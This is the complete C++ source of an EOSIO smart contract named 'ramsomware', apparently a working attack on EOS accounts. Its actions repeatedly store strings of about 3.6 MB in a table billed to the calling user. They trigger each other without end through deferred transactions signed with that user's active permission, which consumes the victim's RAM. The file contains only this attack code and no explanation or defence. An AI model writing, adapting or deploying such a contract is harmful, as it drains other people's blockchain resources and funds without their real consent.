//#include <eosiolib/permission.hpp>
#include <eosiolib/eosio.hpp>
#include <eosiolib/print.hpp>
#include <eosiolib/action.hpp>
//#include <eosiolib/transaction.h>
#include <eosiolib/contract.hpp>
#include <eosiolib/permission.hpp>
#include <eosiolib/action.h>
#include <eosio/serialize.hpp>
using namespace eosio;

class [[eosio::contract]] ramsomware : public eosio::contract {
    private:
        struct [[eosio::table]] person {
            uint64_t key;
            std::string data;
            uint64_t primary_key() const {return key;}
        };
        typedef eosio::multi_index<"people"_n, person> address_index;
    public:
      using contract::contract;
        void upsert(name user, uint64_t idx)
        {
            std::string A = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A; 
            // 3.6MB CONSUME (MAX 4MB)
            address_index addresses(_self, _self.value);
            addresses.emplace(user, [&](auto & row)
            {
                row.key = idx;
                row.data = A;
            });
            print("SUCCESS SAVE DATA\n");
        }

        [[eosio::action]]
        void main(name client, uint64_t idx)
        {
            uint128_t initnum = 1;

            transaction out1{};
            upsert(client, idx);

            int N = 2; // N division

            for (int i =0; i < N ; i ++)
            { 
                out1.actions.emplace_back(permission_level{client, "active"_n}, _self, "func"_n, std::make_tuple( client, uint64_t(N * idx + (1-i)) ) );
                out1.send(N * idx + (1-i), client, false);
                out1.actions.pop_back();
                print ("[+] Seq Number :%d \n", N * idx + (1-i) );
            }
        };
        [[eosio::action]]
        void func(name client, uint64_t idx)
        {
            transaction out{};
            out.actions.emplace_back(permission_level{client, "active"_n}, _self, "main"_n, std::make_tuple(client, uint64_t(idx) ));
            out.send((idx), client, false);
            print("\t[#] FUNC: ", idx);
        };

};

EOSIO_DISPATCH( ramsomware, (main)(func) )

